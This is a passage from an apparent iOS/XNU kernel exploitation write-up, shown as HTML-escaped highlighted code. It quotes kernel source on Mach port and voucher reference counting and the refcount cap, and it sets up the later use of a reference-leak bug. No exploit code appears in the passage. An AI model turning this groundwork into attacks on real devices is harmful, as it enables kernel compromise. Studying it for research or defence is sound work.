&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;603&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_srights&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;604&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;605&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ip_reference&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;606&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ip_unlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;607&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;608&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	    &lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;609&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;610&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_TYPE_MAKE_SEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;611&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;612&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;613&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ip_lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;614&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_active&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;615&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_receiver_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;616&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_receiver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_space_kernel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;617&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;                    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_receiver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_node_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_LOCAL_NODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;618&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_mscount&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;619&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;620&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;621&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_srights&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;622&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ip_reference&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;623&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ip_unlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;624&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;625&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And same for &lt;strong&gt;vouchers&lt;/strong&gt;, the value &lt;strong&gt;iv_refs&lt;/strong&gt; keeps a track of the reference count, as can be seen in &lt;strong&gt;osfmk/ipc/ipc_voucher.c&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_voucher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    64:  * IPC Voucher
    65:  *
    66:  * Vouchers are a reference counted immutable (once-created) set of
    67:  * indexes to particular resource manager attribute values
    68:  * (which themselves are reference counted).
    69:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;70&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_voucher&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;71&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;iv_index_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;iv_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* checksum hash */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;iv_index_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;iv_sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* checksum of values */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;os_refcnt_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;iv_refs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* reference count */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;iv_index_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;iv_table_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* size of the voucher table */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;75&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;iv_index_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;iv_inline_table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IV_ENTRIES_INLINE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;iv_entry_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;iv_table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* table of voucher attr entries */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;iv_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* port representing the voucher */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;78&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;queue_chain_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;iv_hash_link&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* link on hash chain */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;79&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;81&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IV_NULL&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;IPC_VOUCHER_NULL&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The value &lt;strong&gt;iv_refs&lt;/strong&gt; is of the type &lt;strong&gt;os_refcnt_t&lt;/strong&gt;, which is a 32 bit integer, so its range should be from &lt;strong&gt;0-0xffffffff&lt;/strong&gt; right ? Actually not. The maximum value is defined to be &lt;strong&gt;0x0fffffff&lt;/strong&gt; (7 f’s) in the file &lt;strong&gt;libkern/os/refcnt.c&lt;/strong&gt;. You may wonder why ? This is a new mitigation to protect against integer overflows, and makes the reference leaks vulnerability unexploitable, but still a reference counting leak vulnerability can let you increase the reference count and hence perform interesting things as we will see later in this article.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libkern&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;refcnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mo&quot;&gt;05&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;include&lt;/span&gt; 
    &lt;span class=&quot;mo&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;include&lt;/span&gt; 
    &lt;span class=&quot;mo&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;refcnt.h&quot;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;OS_REFCNT_MAX_COUNT&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os_ref_count_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0FFFFFFFUL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OS_REFCNT_DEBUG&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_refgrp_decl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;global_ref_group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;all&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ref_debug_enable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ref_log_nrecords&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Accessing any value out of this range will trigger a kernel panic, as can be seen from the functions below.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libkern&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;refcnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;37&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_ref_check_underflow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_refcnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_ref_count_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__improbable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;os_refcnt: underflow (rc=%p, grp=%s)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ref_grp_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;__builtin_unreachable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;44&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;46&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_ref_assert_referenced&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_refcnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os_ref_count_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__improbable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;os_refcnt: used unsafely when zero (rc=%p, grp=%s)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ref_grp_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;__builtin_unreachable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;51&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;
